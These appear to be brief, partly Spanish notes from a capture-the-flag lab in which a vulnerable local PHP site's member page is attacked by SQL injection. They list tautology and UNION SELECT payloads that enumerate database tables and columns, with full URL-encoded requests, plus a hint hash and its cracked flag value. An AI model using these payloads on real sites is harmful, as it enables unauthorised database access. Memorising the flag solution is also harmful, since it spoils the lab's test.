1 UNION SELECT null, table_name FROM information_schema.tables
http://localhost:8080/index.php?page=member&id=1+UNION+SELECT+null%2C+table_name+FROM+information_schema.tables&Submit=Submit#


1 OR 1=1
1 OR EXISTS (SELECT * FROM users)
http://localhost:8080/index.php?page=member&id=1+OR+EXISTS+%28SELECT+*+FROM+users+%29%3B+--+&Submit=Submit#

http://localhost:8080/index.php?page=member&id=1+UNION+SELECT+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#
1 UNION SELECT table_name, column_name FROM information_schema.columns

"list_images" table contains the following columns: id, url, title, comment

1 OR 1=1 UNION SELECT title, comment from users
desencriptar con md5 la clave hacer lowercase y encriptar con sha256
"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
se convierte en "albatroz"